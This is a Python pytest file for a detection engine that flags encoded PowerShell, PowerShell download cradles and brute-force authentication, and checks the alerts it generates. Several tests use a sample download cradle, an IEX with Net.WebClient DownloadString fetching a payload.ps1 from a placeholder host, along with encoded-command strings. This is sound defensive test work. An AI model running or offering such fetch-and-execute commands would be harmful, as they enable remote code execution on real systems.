from datetime import (
    datetime,
    timedelta,
    timezone,
)
from uuid import uuid4

import pytest

from app.models.security_event import (
    SecurityEvent,
)
from app.services.detection_engine import (
    evaluate_security_event,
    matches_brute_force_authentication,
    matches_encoded_powershell,
    matches_powershell_download_cradle,
)


class FakeScalarResult:
    def __init__(
        self,
        events: list[SecurityEvent],
    ):
        self.events = events

    def all(
        self,
    ) -> list[SecurityEvent]:
        return self.events


class FakeExecuteResult:
    def __init__(
        self,
        events: list[SecurityEvent],
    ):
        self.events = events

    def scalars(
        self,
    ) -> FakeScalarResult:
        return FakeScalarResult(
            self.events
        )


class FakeSession:
    def __init__(
        self,
        events: list[SecurityEvent],
    ):
        self.events = events

    async def execute(
        self,
        statement,
    ) -> FakeExecuteResult:
        return FakeExecuteResult(
            self.events
        )


def create_process_event(
    process_name: str,
    command_line: str,
) -> SecurityEvent:
    return SecurityEvent(
        id=uuid4(),
        event_type="process_creation",
        source="pytest",
        event_time=datetime.now(
            timezone.utc
        ),
        hostname="TEST-WORKSTATION",
        username="test-user",
        source_ip="10.10.10.25",
        process_name=process_name,
        command_line=command_line,
        raw_data={
            "test": True,
        },
    )


def create_authentication_failure(
    event_time: datetime,
    username: str = "bruteforce-test",
    source_ip: str = "203.0.113.50",
) -> SecurityEvent:
    return SecurityEvent(
        id=uuid4(),
        event_type="authentication",
        source="pytest",
        event_time=event_time,
        hostname="TEST-DC",
        username=username,
        source_ip=source_ip,
        raw_data={
            "outcome": "failure",
            "authentication_method":
                "password",
        },
    )


def test_encoded_powershell_matches_enc_switch():
    event = create_process_event(
        process_name="powershell.exe",
        command_line=(
            "powershell.exe "
            "-enc SQBFAFgA"
        ),
    )

    assert (
        matches_encoded_powershell(
            event
        )
        is True
    )


def test_encoded_powershell_matches_encodedcommand_switch():
    event = create_process_event(
        process_name="pwsh.exe",
        command_line=(
            "pwsh.exe "
            "-EncodedCommand SQBFAFgA"
        ),
    )

    assert (
        matches_encoded_powershell(
            event
        )
        is True
    )


def test_benign_powershell_does_not_match_encoded_rule():
    event = create_process_event(
        process_name="powershell.exe",
        command_line=(
            "powershell.exe "
            "Get-Process"
        ),
    )

    assert (
        matches_encoded_powershell(
            event
        )
        is False
    )


def test_non_powershell_process_does_not_match_encoded_rule():
    event = create_process_event(
        process_name="cmd.exe",
        command_line=(
            "cmd.exe "
            "-enc SQBFAFgA"
        ),
    )

    assert (
        matches_encoded_powershell(
            event
        )
        is False
    )


def test_powershell_download_cradle_matches_downloadstring():
    event = create_process_event(
        process_name="powershell.exe",
        command_line=(
            "powershell.exe -c "
            "\"IEX "
            "(New-Object Net.WebClient)"
            ".DownloadString("
            "'https://example.test/"
            "payload.ps1')\""
        ),
    )

    assert (
        matches_powershell_download_cradle(
            event
        )
        is True
    )


def test_benign_powershell_does_not_match_download_cradle_rule():
    event = create_process_event(
        process_name="powershell.exe",
        command_line=(
            "powershell.exe "
            "Get-Service"
        ),
    )

    assert (
        matches_powershell_download_cradle(
            event
        )
        is False
    )


@pytest.mark.asyncio
async def test_four_authentication_failures_do_not_trigger_brute_force():
    base_time = datetime(
        2026,
        8,
        16,
        12,
        0,
        tzinfo=timezone.utc,
    )

    events = [
        create_authentication_failure(
            base_time
            + timedelta(
                minutes=index
            )
        )
        for index in range(4)
    ]

    triggering_event = events[-1]

    session = FakeSession(
        events
    )

    (
        matched,
        failure_count,
    ) = (
        await matches_brute_force_authentication(
            triggering_event,
            session,
        )
    )

    assert failure_count == 4
    assert matched is False


@pytest.mark.asyncio
async def test_five_authentication_failures_trigger_brute_force():
    base_time = datetime(
        2026,
        8,
        16,
        12,
        0,
        tzinfo=timezone.utc,
    )

    events = [
        create_authentication_failure(
            base_time
            + timedelta(
                minutes=index
            )
        )
        for index in range(5)
    ]

    triggering_event = events[-1]

    session = FakeSession(
        events
    )

    (
        matched,
        failure_count,
    ) = (
        await matches_brute_force_authentication(
            triggering_event,
            session,
        )
    )

    assert failure_count == 5
    assert matched is True


@pytest.mark.asyncio
async def test_encoded_powershell_creates_linked_alert():
    event = create_process_event(
        process_name="powershell.exe",
        command_line=(
            "powershell.exe "
            "-enc SQBFAFgA"
        ),
    )

    session = FakeSession(
        []
    )

    alerts = await evaluate_security_event(
        event,
        session,
    )

    assert len(alerts) == 1

    alert = alerts[0]

    assert (
        alert.title
        == "Encoded PowerShell Command Detected"
    )

    assert alert.severity == "high"

    assert alert.status == "new"

    assert (
        alert.source
        == "detection-engine"
    )

    assert (
        alert.detection_rule_id
        == "encoded-powershell"
    )

    assert (
        alert.source_event_id
        == event.id
    )


@pytest.mark.asyncio
async def test_download_cradle_creates_linked_alert():
    event = create_process_event(
        process_name="powershell.exe",
        command_line=(
            "powershell.exe -c "
            "\"IEX "
            "(New-Object Net.WebClient)"
            ".DownloadString("
            "'https://example.test/"
            "payload.ps1')\""
        ),
    )

    session = FakeSession(
        []
    )

    alerts = await evaluate_security_event(
        event,
        session,
    )

    assert len(alerts) == 1

    alert = alerts[0]

    assert (
        alert.title
        == "PowerShell Download Cradle Detected"
    )

    assert alert.severity == "high"

    assert (
        alert.source
        == "detection-engine"
    )

    assert (
        alert.detection_rule_id
        == "powershell-download-cradle"
    )

    assert (
        alert.source_event_id
        == event.id
    )


@pytest.mark.asyncio
async def test_brute_force_creates_linked_alert():
    base_time = datetime(
        2026,
        8,
        16,
        12,
        0,
        tzinfo=timezone.utc,
    )

    events = [
        create_authentication_failure(
            base_time
            + timedelta(
                minutes=index
            )
        )
        for index in range(5)
    ]

    triggering_event = events[-1]

    session = FakeSession(
        events
    )

    alerts = await evaluate_security_event(
        triggering_event,
        session,
    )

    assert len(alerts) == 1

    alert = alerts[0]

    assert (
        alert.title
        == "Possible Brute Force Attack"
    )

    assert alert.severity == "high"

    assert alert.status == "new"

    assert (
        alert.source
        == "detection-engine"
    )

    assert (
        alert.detection_rule_id
        == "auth-brute-force"
    )

    assert (
        alert.source_event_id
        == triggering_event.id
    )

    assert (
        "5 failed authentication attempts"
        in alert.description
    )